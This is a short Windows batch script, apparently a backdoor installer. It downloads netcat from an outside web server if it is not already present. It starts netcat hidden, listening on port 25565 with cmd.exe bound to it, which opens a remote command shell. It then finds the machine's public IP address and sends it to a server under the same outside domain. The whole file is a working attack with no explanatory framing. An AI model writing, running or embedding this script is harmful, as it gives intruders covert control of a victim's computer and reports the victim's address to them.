::@echo off
::mode con: cols=15 lines=1

set file=nc64.exe

cd ../../../../../../..

::start netcat
if exist %file% (

  start nc64.exe -d -lp 25565 -e cmd.exe

) else (

  powershell "wget http://website.net/scripts/nc64.exe -OutFile ~/%file%" && start nc64.exe -d -lp 25565 -e cmd.exe

)

for /f %%a in ('powershell Invoke-RestMethod api.ipify.org') do set PublicIP=%%a

::Ping server to update ip
powershell "wget website.net/scripts/server.php?ip=%PublicIP%"
